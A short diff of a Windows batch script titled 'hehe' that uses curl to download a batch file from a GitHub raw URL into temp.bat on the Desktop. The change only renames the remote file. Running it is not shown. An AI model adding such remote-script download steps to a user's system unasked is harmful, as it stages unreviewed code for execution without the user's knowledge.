@@ -2,7 +2,7 @@ title hehe
 echo off
 cd Desktop
 
-curl https://raw.githubusercontent.com/kamilix2003/pejAD/master/reklama.bat > temp.bat
+curl https://raw.githubusercontent.com/kamilix2003/pejAD/master/file.bat > temp.bat
 
 timeout 1
 
